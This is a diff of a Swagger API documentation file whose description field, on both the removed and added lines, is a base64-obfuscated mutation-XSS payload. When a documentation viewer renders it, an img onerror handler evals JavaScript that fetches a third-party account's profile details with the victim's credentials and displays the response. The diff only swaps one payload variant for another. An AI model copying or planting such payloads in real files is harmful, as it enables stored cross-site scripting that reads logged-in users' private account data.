@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='dXJsPSdodHRwczovL2FjY291bnQuYmxpYmxpdGlrZXQuY29tL2dhdGV3YXkvZ2tzLXVubS1nby1iZS9hcGkvdjEvcHJvZmlsZS9kZXRhaWxzJztmZXRjaCh1cmwse2NyZWRlbnRpYWxzOidpbmNsdWRlJ30pLnRoZW4oZnVuY3Rpb24ocmVzcG9uc2Upe3JldHVybityZXNwb25zZS50ZXh0KCk7fSkudGhlbihmdW5jdGlvbihkYXRhKXthbGVydChKU09OLnN0cmluZ2lmeShKU09OLnBhcnNlKGRhdGEpKSk7fSk7' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZnVuY3Rpb24gY29ycygpe3ZhciB4aHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXtpZih0aGlzLnN0YXR1cz09MjAwKXthbGVydCh0aGlzLnJlc3BvbnNlVGV4dCk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlbW8nKS5pbm5lckhUTUw9dGhpcy5yZXNwb25zZVRleHQ7fX07eGh0dHAub3BlbignR0VUJywnaHR0cHM6Ly9hY2NvdW50LmJsaWJsaXRpa2V0LmNvbS9nYXRld2F5L2drcy11bm0tZ28tYmUvYXBpL3YxL3Byb2ZpbGUvZGV0YWlscycsdHJ1ZSk7eGh0dHAud2l0aENyZWRlbnRpYWxzPXRydWU7eGh0dHAuc2VuZCgpO31jb3JzKCk7' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
